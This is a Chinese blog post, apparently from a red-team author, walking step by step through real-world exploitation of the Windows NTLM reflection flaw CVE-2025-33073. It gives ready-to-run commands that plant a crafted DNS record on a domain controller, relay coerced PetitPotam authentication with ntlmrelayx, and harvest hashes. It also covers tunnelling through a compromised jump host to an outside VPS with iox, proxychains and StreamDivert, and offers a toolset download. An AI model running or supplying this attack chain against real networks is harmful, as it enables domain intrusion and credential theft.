> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4NDU4OTQ1NA==&mid=2247484740&idx=1&sn=efcc3f00d734e8b8bf6e9bf129f586d0

#  内网横行：大杀器之实战场景下的 CVE-2025-33073 全流程利用指南 | 附利用工具集  
原创 薛定的饿猫  饿猫的小黑屋   2025-06-25 01:26  
  
**前言**  
****  
  
  
参考资料  
  
在上一篇文章中，对   
CVE-2025-33073  
 的漏洞原理进行了比较深入的分析，同时在靶场环境中进行了漏洞复现。出于漏洞原理和红队行动规范的原因， CVE-2025-33073 在实际利用的过程中比靶场会更加麻烦一些。本文将基于实战利用的场景对 CVE-2025-33073 进行全流程的攻击梳理。  
1. 靶场复现中存在的 Windows 端口占用问题在实战中没有太大影响，因为不可避免的需要走隧道进行利用，那么外网的 VPS 机器直接选择 Linux 即可。如果确实有需要用到 Windows 进行利用的情况，按照章节   
0x04  
 中不出网的部分进行转发即可。为了帮助小白更好的理解，文章最后也会对其单独进行讲解。  
  
1. 为了使流程更加清晰，文中按照步骤搭建不同的隧道，实战情况下可以使用 frp 等能转发 SMB 的工具进行转发，简化利用流程并减少文件上传的数量。  
  
如果想深入了解此漏洞，建议阅读前文。  
> 内网横行：CVE-2025-33073漏洞分析与攻击复现  
  
> 薛定的饿猫，公众号：饿猫的小黑屋[内网横行：CVE-2025-33073漏洞分析与攻击复现](http://mp.weixin.qq.com/s?__biz=Mzg4NDU4OTQ1NA==&mid=2247484712&idx=1&sn=02ff86815b2cb114cbfcea520ff2db51&chksm=cfb493c9f8c31adfec2590226974b21f93d10095abfd157d19e38dd2c460a04e7a8301931b90#rd)  
  
  
  
0x01 最简攻击流程梳理  
  
  
参考资料  
  
先回顾一下正常攻击的流程，主要分为三个步骤：  
  
1.   
向 DNS 服务器（域控）添加 DNS 记录。  
  

```
python dnstool.py -u luckytom.com\domainuser01 -p User01!@# -r badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.214.130（攻击机IP） --action modify 192.168.214.134（域控IP）
```

  
  
2.   
开启监听，用于接收目标服务器发起的认证请求并反射回给目标服务器  
。  
  

```
python ntlmrelayx.py -t 192.168.214.135（目标机IP） -smb2support
```

  
  
3.   
强制目标服务器向指定的主机发起 NTLM 认证  
。  
  

```
python PetitPotam.py -d luckytom.com -u domainuser01 -p User01!@# badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.214.135（目标机IP）
```

  
  
具体的攻击逻辑是如何实现的呢?  
  

```
1. 攻击者在域控上添加一条精心构造的 DNS 记录，将主机名 badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 指向攻击者IP
2. 攻击者在内网跳板机（不必在域内，网络连通即可）上启动 SMB/LDAP 等协议的监听，接收到目标主机发起的 NTLM 认证请求后将其反射回目标主机
3. 强制目标主机向 badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 发起 NTLM 认证
3. 目标主机向域控查询 badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 的 A 记录，并解析到攻击者IP
4. 目标主机向攻击者 IP 发起 NTLM 认证请求
5. 攻击者将收到的认证请求反射回目标主机
6. 目标主机触发漏洞进行本地身份验证
7. 在本地身份验证握手中，攻击者监听到有 Token 的上下文句柄，并提取 Hash
```

  
0x02 实战中不是问题的问题  
  
  
参考资料  
  

```
1. Windows 445 端口占用
2. 相关利用脚本均依赖impacket
```

  
  
依赖  
impacket  
是很常见的问题，一般走隧道解决即可，主要问题在于入口机器如果是 Windows 的话，则会存在因为系统默认的 SMB 服务导致的端口占用问题。  
  
如果在 Windows 下直接开启监听，那么会遇到监听失败的情况，而如果通过  
--smb-port  
监听指定端口，又会导致默认是跟 445 端口进行验证而无法正常获取到上下文句柄的问题。那么如何解决呢？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2El0HJiatcJSs4WicBZ1RGVWJVr730xYzYCoI0LPYjklEsPQ6oSticRtAJnA/640?wx_fmt=png&from=appmsg "")  
  
原本想通过对 PetitPotam.py 进行改造以实现非默认端口的认证，但是受限于   
badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  
 的影响，最终没找到可以直接指定端口的方法，具体原因不与漏洞原理有关，可以参考上一篇文章，如果有师傅想继续研究可以跟我交流。  
  
除此之外还能想到就是端口转发，关闭SMB服务等方法。关闭SMB服务对系  
统影响较大  
，也不符合红队行动规范，因此最终通过  
康哥（@浮尘云烟）  
推荐的   
StreamDivert  
 实现转发，  
具体的利用  
将在后续讲到。  
  
那么为什么说这是一个不是问题的问题呢？因为在实际利用当中我们大概率是会使用隧道来执行脚本的，那么我们的攻击机器完全可以使用 Linux 系统。  
  
0x03   
完整攻击流程  
  
  
参考资料  
  
搭建环境如下，并将入口机上线到攻击机的 CS：  
  

```
已获得普通域用户：domainuser01 / User01!@#
域控DC Windows server 2022：192.168.214.134
域内目标主机 Windows server 2022：192.168.214.135 
入口跳板主机 Windows server 2022
  192.168.214.136
  192.168.56.130 (模拟外网IP) 
攻击机 Windows 11：192.168.56.131
公网VPS Kali Linux：192.168.56.10 | 分配一个 192.168.214.137 模拟目标机器出网
```

  
  
一. 目标主机出网  
  
在目标出网的情况下可以直接在 VPS 服务器上进行监听。  
  
1.   
开启   
socks  
 代理并配置本地   
proxifier  
 。  
  

```
iox.exe proxy -l 8080
```

  
  
2.   
向域控  
添加 DNS 解析记录  
。因为 LDAP 使用 TCP 而 DNS 查询使用 UDP （DNS 服务器一般默认支持 TCP 查询），为了实现实战中不同工具场景下更好的兼容性 ，最好是将 UDP 封装到 TCP 中传输 ，  
dnstool.py  
 已经集成了该功能，可以非常方便的直接使用。  
  

```
python dnstool.py -u luckytom.com\domainuser01 -p User01!@# -r badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.214.137 --action modify 192.168.214.134 --tcp
＃ 这里必须加 --tcp 参数将 UDP 封装在 TCP中进行 DNS 查询
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElNVnpeR4DRjEJx1cclcqfpLIjhKPFibOgbRAxfOAicJ0dzTiakbp63ibJeg/640?wx_fmt=png&from=appmsg "")  
  
  
3.   
开启 relay 监听，因为目标主机出网因此不必指定端口。  
  

```
python ntlmrelayx.py -t 192.168.214.135 --smb2support
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTaickfzr63icBna6VLknAdpvHKRg9KEQWwvWVicVMrPTqib91lNPOdu1wVRGJNmfvibQ0wNF41BECGAxA/640?wx_fmt=png&from=appmsg "")  
  
4.   
强制目标主机发起   
NTLM 认证  
。  
  

```
python PetitPotam.py -d luckytom.com -u domainuser01 -p User01!@# badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.214.135
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElgJHQ5okYIjsexJU50BaIiaYm0p9N2rEGSKrlPIHNf3eFAY5STnVq5lQ/640?wx_fmt=png&from=appmsg "")  
  
  
5.   
监听主机接收到 Hash。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElwLTveyMHJ117rPAtehPUibkchbE2DibCKNGZMtAzOWTuwwBkWDMuZ6oQ/640?wx_fmt=png&from=appmsg "")  
  
二. 目标主机不出网  
  
搭建环境如下，并将入口机上线到攻击机的 CS：  
  

```
已获得普通域用户：domainuser01 / User01!@#
域控DC Windows server 2022：192.168.214.134
域内目标主机 Windows server 2022：192.168.214.135
入口跳板主机 Windows server 2022
  192.168.214.136
  192.168.56.130 (模拟外网IP) 
攻击机 Windows 11：192.168.56.131
公网VPS Kali Linux：192.168.56.10
```

  
  
这种情况需要在入口机器上搭建一层隧道来实现流量的转发。  
  
1.   
开启   
socks  
 代理并配置本地   
proxifier  
 。  
  

```
iox.exe proxy -l 8080
```

  
  
2.   
向域控添加   
DNS 解析记录  
，此时需要将解析指向入口机器 IP   
192.168.214.130  
。  
  

```
python dnstool.py -u luckytom.com\domainuser01 -p User01!@# -r badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 192.168.214.130 --action modify 192.168.214.134 --tcp
＃ 这里必须加 --tcp 参数将 UDP 封装在 TCP中进行 DNS 查询
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2El9ECSwYiaZtYHV24uWcSOibialo34w5EuXhJddAbBu4hHcOSBQajemE3cw/640?wx_fmt=png&from=appmsg "")  
  
  
3  
.  
   
在   
VPS  
 开启监听。如果是 Windows 主机，则使  
用  
--smb-port   
指定  
一个端口。  
  
注意这里需要使用   
proxychains  
 来运行   
ntlmrelayx.py  
 ，因为 VPS 接收到目标机器的验证请求之后需要通过   
iox  
 隧道将其反射回内网。具体原理可以参考上一篇文章。  

```
proxychains python3 ntlmrelayx.py -t 192.168.214.135 -smb2support
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElfH6XY55PI6SvLlHHlic93ic817LicnyybF396Dl0hibAib7XofI34m5FDicw/640?wx_fmt=png&from=appmsg "")  
  
  
4.   
在入口机搭建隧道，将本地 445 端口入站流量转发到远程 VPS 主机的监听端口。  
  
StreamDivert  
 配置文件如下：  

```
tcp < 445 0.0.0.0 -> 192.168.56.10 445
```


```
5. 加载配置文件启动转发：
```


```
shell StreamDivert.exe config.txt
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElT7EdNQ1uYmNjnfeDgV2cZUJYHSmjc4ibib1oKo7nQ2Y2SIwCG21iaqQBg/640?wx_fmt=png&from=appmsg "")  
  
6.   
强制目标主机发起 NTLM 认证。  

```
python PetitPotam.py -d luckytom.com -u domainuser01 -p User01!@# badtom1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.214.135
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2El5omDmUWIhOEP9uPibfBtvkeHfWyNk5tEYBdOiawhibCTn6xDibSOKwcumQ/640?wx_fmt=png&from=appmsg "")  
  
7.   
攻击完成。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2EljPh2GDQnJ6pmUcObLoxnrU8ZyWvtzW8VzozwicMwL46tQiaNP4JrnTEA/640?wx_fmt=png&from=appmsg "")  
  
0x04   
Windows 端口占用问题  
  
  
参考资料  
  
跟前面差不多，就不赘述了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/rA9dDxDOarTN8zeB3TxJOSGgf0Pad2ElG9dDVFvaPEjG0fXuc7sjnicoicslXqhoTwnW3uvkwpYa2mBwYGSVeIoA/640?wx_fmt=png&from=appmsg "")  
  
参考链接  
  

```
https://mp.weixin.qq.com/s/NrGyltW-f8a3Zqr0-4oYnw
```

  
  
  
*  
  
后台回复“CVE-2025-33073”获得工具集下载地址  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/rA9dDxDOarQvwxWqIZkXL6ibTEBOB4hNhtuJcQcLM3f3VKllE3RmlNIx2Tz5Djg4yptIxV5ibhUgDNEvFW6GZfQQ/640?wx_fmt=jpeg "")  
  
  
  
  
